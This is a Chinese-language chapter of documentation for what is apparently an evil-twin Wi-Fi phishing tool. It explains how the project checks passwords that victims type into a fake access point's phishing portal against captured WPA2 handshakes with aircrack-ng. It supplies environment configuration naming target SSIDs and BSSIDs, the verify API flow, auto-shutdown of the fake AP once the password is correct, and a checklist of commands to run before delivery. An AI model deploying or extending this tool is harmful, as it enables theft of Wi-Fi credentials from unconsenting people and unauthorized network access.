# 第 6 章 密码自动验证机制

> 捕获到密码后怎么知道对不对？本项目用**真实 WPA2 握手**做即时验证：正确 → 自动收尾；错误 → 让受害者重输。本章讲透原理与配置。

## 6.1 WPA2 密码验证原理

WPA2-PSK 的密钥派生（PBKDF2）：

```
PMK = PBKDF2-SHA1(密码, SSID, 4096次, 32字节)
PTK = PRF(PMK, ANonce, SNonce, AP_MAC, Client_MAC)
MIC = 对握手帧做 HMAC(PTK)
```

- **确定性**：给定（密码, SSID, 4 个随机数, 2 个 MAC），MIC 是唯一确定的
- 抓到的握手帧里包含 ANonce/SNonce/MAC/MIC
- **验证候选密码**：用候选密码重新走一遍派生 → 算 MIC → 与抓到的 MIC 比对
- 一致 → 密码正确；不一致 → 密码错误

所以 `aircrack-ng -w 单密码文件 握手` 本质是**算一次 PMK 并比对**，1 秒内出结果（比穷举快是因为只算 1 个候选）。

## 6.2 配置验证基准（EVIL_HASHES）

控制台通过环境变量 `EVIL_HASHES` 加载验证基准，格式：

```
SSID:/绝对路径/hccapx文件:AP的BSSID
```

多个目标用 `;` 分隔：

```bash
export EVIL_HASHES="CMCC-gf7e:/opt/evil-twin/handshakes/gf7e.hccapx:C8:75:F4:40:D6:8A;WU_5G:/opt/evil-twin/handshakes/wu5g.hccapx:FA:07:B2:AC:30:45"
```

> ⚠️ 三个要素必须与目标**完全一致**：SSID 必须等于攻击目标名；hccapx 必须是该 AP 的**有效**握手；BSSID 必须与该 AP 相同。任何一处不一致都会导致验证失效。

## 6.3 验证流程（代码级）

```
portal.py 收到密码
   └─ POST /api/verify {"password":"xxx"}
        └─ verify_password():
             ├─ HASHES 里查目标 SSID → 无 → 跳过验证（当成功）
             ├─ hccapx 文件不存在 → 跳过验证
             ├─ 密码写入 .verify_tmp.txt（防引号注入）
             ├─ aircrack-ng -w tmp -b <BSSID> <hccapx>
             └─ 输出含 "KEY FOUND" → 正确
        └─ 正确 → 写历史记录（只记正确密码）+ 4 秒后自动关假 AP
```

## 6.4 三种验证结果

| 场景 | 行为 |
|---|---|
| 密码正确 | 钓鱼页显示"认证成功" → 4 秒后自动关闭假 AP → 历史记录写入 |
| 密码错误 | 钓鱼页提示"密码错误，请重新输入" → 继续等 |
| 未配置 EVIL_HASHES | 跳过验证，捕获即当成功（纯演示模式） |

## 6.5 常见问题

### Q1：正确密码也报错？

几乎都是 **hccapx 无效**。检查方法：

```bash
echo '你确认的正确密码' > /tmp/t.txt
aircrack-ng -w /tmp/t.txt -b <BSSID> <hccapx>
# 必须看到 KEY FOUND!
# 若 Master Key 全 0 / KEY NOT FOUND → 握手无效，重新抓（第 3 章 3.3）
```

### Q2：改了 WiFi 密码后验证全挂？

握手与密码绑定，改密码必须**重抓握手**并更新 EVIL_HASHES。

### Q3：能用 22000 格式吗？

本项目验证用 `hccapx`（aircrack-ng 原生）。`22000` 是 hashcat 格式，树莓派/ARM 上 hashcat 极慢（实测 2428 H/s），仅用于 PC 端 hashcat 离线破解，与本项目验证无关。

## 6.6 完整自测清单（交付前必跑）

```bash
# 1. 握手有效（用已知密码）
echo '12345678' | aircrack-ng -w - -b C8:75:F4:40:D6:8A gf7e.hccapx   # → KEY FOUND

# 2. 错误密码拒绝
echo '00000000' | aircrack-ng -w - -b C8:75:F4:40:D6:8A gf7e.hccapx   # → KEY NOT FOUND

# 3. API 验证（攻击中）
curl -X POST http://127.0.0.1:8090/api/verify -d '{"password":"12345678"}'
# → {"ok": true, "note": "verified"}

# 4. 历史只记正确密码
# 攻击中先输错误密码再输正确密码 → 历史应只有正确那条
```
